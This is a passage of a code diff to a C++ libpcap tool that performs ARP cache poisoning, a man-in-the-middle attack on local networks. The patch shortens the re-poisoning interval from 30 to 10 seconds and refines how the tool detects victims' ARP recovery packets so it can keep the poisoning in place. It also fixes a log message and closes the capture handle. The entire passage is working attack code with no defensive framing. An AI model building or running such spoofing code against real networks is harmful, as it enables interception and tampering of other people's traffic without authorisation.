@@ -202,7 +202,7 @@ void arp_spoof(pcap_t *pcap, Mac src_mac, Ip target_ip, Mac sender_mac, Ip sende
         fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
 
-    printf("[-] ARP spoofed for flow %s -> %s\n",std::string(target_ip).data(), std::string(sender_ip).data());
+    printf("[-] ARP spoofed for flow %s -> %s\n",std::string(sender_ip).data(), std::string(target_ip).data());
 }
 
 // Send ARP packet periodically
@@ -219,10 +219,10 @@ void handle_spoofing_flows(char *dev, Flow flow, Mac my_mac){
     const u_char *packet;
 
     while(true){
-        // Send ARP spoofing packet for every 30s
+        // Send ARP spoofing packet for every 10s
         auto now = std::chrono::steady_clock::now();
         auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_spoof);
-        if (elapsed > std::chrono::seconds(30)) {
+        if (elapsed > std::chrono::seconds(10)) {
             arp_spoof(pcap, my_mac, flow.t_ip, flow.s_mac, flow.s_ip);
             last_spoof = now;
         }
@@ -239,10 +239,13 @@ void handle_spoofing_flows(char *dev, Flow flow, Mac my_mac){
         // Handle ARP packet : Received ARP packet may trigger ARP recovery (either Broadcast or Unicast)
         if (ntohs(eth_hdr->type_) == EthHdr::Arp) {
             if (eth_hdr->smac_ == flow.s_mac && eth_hdr->dmac_ == my_mac) {
-                printf("[!] ARP recover detected for flow %s -> %s\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
+                printf("[!] ARP recover detected for flow %s -> %s (Unicast from sender)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
             }
-            else if (eth_hdr->dmac_ == Mac::broadcastMac()) {
-                printf("[!] ARP recover detected for flow %s -> %s\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
+            else if (eth_hdr->dmac_ == Mac::broadcastMac() && eth_hdr->smac_ == flow.s_mac) {
+                printf("[!] ARP recover detected for flow %s -> %s (Broadcast from sender)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
+            }
+            else if (eth_hdr->dmac_ == Mac::broadcastMac() && eth_hdr->smac_ == flow.t_mac) {
+                printf("[!] ARP recover detected for flow %s -> %s (Broadcast from target)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
             }
             else {
                 continue;
@@ -268,6 +271,7 @@ void handle_spoofing_flows(char *dev, Flow flow, Mac my_mac){
             }
         }
     }
+    pcap_close(pcap);
 }
 
 void start_spoof_thread (char *dev, Mac my_mac){
